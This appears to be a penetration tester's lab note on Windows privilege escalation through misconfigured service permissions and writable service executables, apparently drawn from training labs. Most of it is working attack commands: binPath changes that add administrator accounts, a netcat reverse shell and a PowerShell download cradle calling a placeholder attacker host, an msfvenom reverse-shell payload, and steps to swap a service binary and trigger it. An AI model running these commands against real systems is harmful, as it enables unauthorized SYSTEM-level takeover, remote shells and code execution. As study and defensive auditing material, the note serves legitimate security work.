---
created: 2026-07-23
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
>[!abstract]+ **Scope**: Local Windows privilege escalation through misconfigured Service Control Manager (SCM) security descriptors and weak filesystem permissions on service executables.

- When a misconfigured ACE (Access Control Entry) in a SCM object DACL or filesystem ACL allows you to modify the service configuration or overwrite its executable file, you can execute arbitrary commands with the privileges of the service account (typically `NT AUTHORITY\SYSTEM`).

---

- [ ] Enumerate services running as `SYSTEM` or other privileged accounts (`Get-CimInstance`, `SharpUp`).
- [ ] Audit SCM service object DACLs for `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` (`accesschk.exe`).
- [ ] Inspect existing service configuration parameters and binary paths (`sc.exe qc`).
- [ ] Reconfigure the service binary path (`binPath`) to execute a privileged command string (`sc.exe config`).
- [ ] Inspect filesystem permissions on service executables and parent directories (`icacls`).
- [ ] Backup and replace modifiable service executables with custom payload files.
- [ ] Restart the target service or trigger execution, verify elevated access, and restore original configurations.

---

## Service security descriptors and access rights

- Most background Windows services run under `NT AUTHORITY\SYSTEM` (or other privileged accounts).
- Each service maintains a security descriptor within the SCM database and registry.
- This security descriptor contains a DACL that defines which security principals can inspect, start, stop, or reconfigure the service.

- Key service access rights in Windows service security descriptors:

| Access right | Hex mask | Operational impact |
| :--- | :--- | :--- |
| `SERVICE_CHANGE_CONFIG` | `0x0002` | Allows modifying service configuration parameters, including `binPath` (`sc.exe config`). |
| `SERVICE_START` | `0x0010` | Allows starting the service (`sc.exe start`). |
| `SERVICE_STOP` | `0x0020` | Allows stopping the running service (`sc.exe stop`). |
| `SERVICE_ALL_ACCESS` | `0xF01FF` | Grants full control over the service object (includes all configuration, start, stop, and query rights). |


>[!note] See [`Access Rights for a Service, Service Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights#access-rights-for-a-service).

>[!note] See [`Service Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

- If your account holds `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` permissions on a service, you can overwrite its `binPath` property. The configured command executes in the security context of the service account when the service starts.

## Enumerating system services and permissions

- You can identify services with weak permissions automatically using [`SharpUp`](https://github.com/GhostPack/SharpUp/):

```powershell
.\SharpUp.exe audit
```

> [!example]-
> ```powershell
> PS C:\Tools> .\SharpUp.exe audit
>
> === SharpUp: Running Privilege Escalation Checks ===
>
>
> === Modifiable Services ===
>
>   Name             : WindscribeService
>   DisplayName      : WindscribeService
>   Description      : Manages the firewall and controls the VPN tunnel
>   State            : Running
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
>
>
> === Modifiable Service Binaries ===
>
>   Name             : SecurityService
>   DisplayName      : PC Security Management Service
>   Description      : Responsible for managing PC security
>   State            : Stopped
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
>
>
> === AlwaysInstallElevated Registry Keys ===
>
>
>
> === Modifiable Folders in %PATH% ===
>
>
>
> === Modifiable Registry Autoruns ===
>
>
>
> === *Special* User Privileges ===
>
>
>
> === Unattended Install Files ===
>
>
>
> [*] Completed Privesc Checks in 10 seconds
> ```

- Enumerate all installed services and display key configuration properties using `Get-CimInstance`:

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Format-Table -AutoSize
```

- Filter for services running as `SYSTEM` and located outside the `C:\Windows` directory:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' -and $_.PathName -notlike 'C:\Windows*' } | Format-Table Name, PathName, StartMode -AutoSize
```

- Audit write permissions across all registered service objects using [`AccessChk`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk):

```powershell
accesschk.exe /accepteula -quvcw *
```

>[!note]+ `accesschk.exe` flags
> | Flag | Description |
| ---- | ------------------------------------ |
| `-q` | Omit banner.                         |
| `-u` | Suppress errors.                     |
| `-v` | Verbose output.                      |
| `-c` | Specify name of a Windows service.   |
| `-w` | Show only objects with write access. |

>[!tip]+ 
> - Export access results to a file:
> ```powershell
> accesschk.exe /accepteula -quvcw * > C:\Temp\services_access.txt 2>&1
> ```
> - Filter the output for exploitable service access rights:
> ```powershell
> findstr /I /R /C:"SERVICE_CHANGE_CONFIG" /C:"SERVICE_ALL_ACCESS" C:\Temp\services_access.txt
> ```

- Check write permissions for your current user on a specific service (e.g., `WindscribeService`):

```powershell
accesschk.exe /accepteula -quvcw WindscribeService
```

> [!example]-
> ```powershell
> .\accesschk.exe /accepteula -quvcw WindscribeService
> ```
> 
> ```powershell
> Accesschk v6.13 - Reports effective permissions for securable objects
> Copyright ⌐ 2006-2020 Mark Russinovich
> Sysinternals - www.sysinternals.com
> 
> WindscribeService
>   Medium Mandatory Level (Default) [No-Write-Up]
>   RW NT AUTHORITY\SYSTEM
>         SERVICE_ALL_ACCESS
>   RW BUILTIN\Administrators
>         SERVICE_ALL_ACCESS
>   RW NT AUTHORITY\Authenticated Users
>         SERVICE_ALL_ACCESS
> ```
>- `NT AUTHORITY\SYSTEM`, `Admnistrators`, and `Authenticated Users` all have full control over `WindscribeService`.
>-  Any authenticated user can modify the service configuration, and therefore obtain arbitrary code execution in the security context of the service by modifying its `ImagePath` or other parameters.
>
>>[!info] `Authenticated Users` is a special Windows security group that automatically includes **any user account that has successfully logged on** using valid credentials. 
>> `Authenticated Users` includes all local user accounts, domain accounts, and accounts from trusted domains, but explicitly **excludes the built-in `Guest` account and `Anonymous Logon` sessions**. See [[Windows groups]].
>

- Display configuration of a specific service:

```powershell
sc.exe qc WindscribeService
```

| Command | Description |
| :--- | :--- |
| `sc.exe query` | Displays running status and basic state for active service instances. |
| `sc.exe qc` | Displays detailed service configuration parameters (binary path, startup type, service account). |
| `sc.exe queryex` | Displays extended status including PID and process flags. |
| `sc.exe start` | Sends a start request to the Service Control Manager for the specified service. |
| `sc.exe stop` | Sends a stop control request to the running service process. |
| `sc.exe pause` | Sends a pause control request to the service process. |
| `sc.exe continue` | Resumes a paused service. |
| `sc.exe config` | Modifies persistent service configuration parameters in the SCM database. |

>[!important] In PowerShell, explicitly specify the extension for `sc.exe`; the bare name `sc` is a built-in alias for the [`Set-Content`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-7.6) cmdlet.

- Query WMI for service startup configurations and paths:

```powershell
wmic service get name,displayname,pathname,startmode
```

```powershell
Get-CimInstance Win32_StartupCommand
```

## Exploiting writable service configuration

- When your account has `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` rights, you can overwrite the `binPath` parameter using `sc.exe config`.
- Any commands you set in `binPath` execute under the security context of the target service on next service start.

- Reconfigure `binPath` to add your current user to the local `Administrators` group:

```powershell
sc.exe config WindscribeService binpath="cmd.exe /c net localgroup administrators jdoe /add"
```

>[!note] `SharpUp` reports this type of misconfiguration under `Modifiable Services`.

- Reconfigure `binPath` to create a new local user and add it to the local `Administrators` group:

```powershell
sc.exe config WindscribeService binpath="cmd.exe /c net user jdoe 'passwd123' /add && net localgroup administrators jdoe /add"
```

- Reconfigure `binPath` to execute a Netcat reverse shell payload:

```powershell
sc.exe config WindscribeService binpath="cmd.exe /c C:\Temp\nc.exe -e cmd.exe <attacker_ip_address> 443"
```

- Reconfigure `binPath` to execute an in-memory PowerShell cradle without touching disk:

```powershell
sc.exe config WindscribeService binpath="cmd.exe /c powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip_address>/shell.ps1')\""
```

> [!example]-
> ```powershell
> PS C:\Tools> sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
>```
>
>```powershell
> [SC] ChangeServiceConfig SUCCESS
> ```

-  Restart the service to trigger execution:

```powershell
sc.exe stop WindscribeService
```

```powershell
sc.exe start WindscribeService
```

>[!example]+ Expected service start error
> ```powershell
> PS C:\Tools> sc.exe start WindscribeService
>```
>```powershell
> [SC] StartService FAILED 1053:
>
> The service did not respond to the start or control request in a timely fashion.
> ```

- The service is **expected to fail** on `sc.exe start` because its configured executable has been replaced with a command that does not behave like a Windows service (doesn't return the status expected by the Service Control Manager).
- However, the configured `cmd.exe /c` payload **executes before SCM reports the failure**.

>[!tip]+ 
>- Verify group membership:
> ```powershell
> net localgroup administrators
> ```

>[!tip]+
> - Restore the original service binary path:
> ```powershell
> sc.exe config WindscribeService binpath="\"C:\Program Files (x86)\Windscribe\WindscribeService.exe\""
> ```
> - Restart the service:
> ```powershell
> sc.exe start WindscribeService
> ```
> - Check the service state:
> ```powershell
> sc.exe query WindscribeService
> ```

## Exploiting weak permissions on service executables

- If you can modify the service binary or write to any of its parent directories (write (`W`), modify (`M`), or full control (`F`) permissions), you can overwrite the executable with your custom payload. 
- When the service restarts, your payload executes in the same security context as the target service.

- Inspect filesystem permissions on the service executable:

```powershell
icacls "C:\Program Files (x86)\Example\Service.exe"
```

>[!note] `SharpUp` reports this type of misconfiguration under `Modifiable Service Binaries`.

- Check permissions of all parent directories along the service binary path:

```powershell
icacls "C:\Program Files\Example\"
icacls "C:\Program Files\"
icacls "C:\"
```

- Generate a standalone reverse shell payload executable on your listener machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=443 -f exe -o SecurityService.exe
```

- Create a backup copy of the legitimate service executable:

```powershell
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\Temp\SecurityService.exe.bak
```

- Transfer the binary to the target system (see [[🛠️ Windows file transfers]]):

```bash
python3 -m http.server 8080
```
```powershell
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<attacker_ip_address>:8080/SecurityService.exe','C:\Temp\SecurityService.exe')"
```

- Overwrite the legitimate service executable with your payload executable:

```powershell
copy /Y C:\Temp\SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

- Restart the service to trigger execution:

```powershell
sc.exe stop SecurityService
```

```powershell
sc.exe start SecurityService
```

- If you don't have permissions to restart the service via `sc.exe`, check whether the service `StartMode` is set to `Auto`. If configured for automatic startup, kill the service process (`taskkill /F /PID <PID>`) or reboot the host (`shutdown /r /t 0`) to trigger automatic execution.

>[!tip]+
> - Verify that elevated shell access has been established:
> ```powershell
> whoami
> ```
> ```powershell
> whoami /priv
> ```

>[!tip]+
> - Stop the service before restoring the original executable:
> ```powershell
> sc.exe stop SecurityService
> ```
> - Restore the original service executable from backup:
> ```powershell
> copy /Y C:\Temp\Service.exe.bak "C:\Program Files (x86)\Example\Service.exe"
> ```
> - Restart the original service:
> ```powershell
> sc.exe start SecurityService
> ```
> - Remove temporary staging files:
> ```powershell
> del C:\Temp\SecurityService.exe C:\Temp\SecurityService.exe.bak
> ```

## References and further reading

- [`Service Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
- [`AccessChk — Microsoft Sysinternals`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [`SharpUp — GitHub`](https://github.com/GhostPack/SharpUp/)
- [`icacls — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [`sc.exe — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query)
- [`Privilege Escalation with Autorun Binaries — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
- [`EoP - Weak Service Permissions — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#weak-service-permissions)
- [`Dynamic-link library search order — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)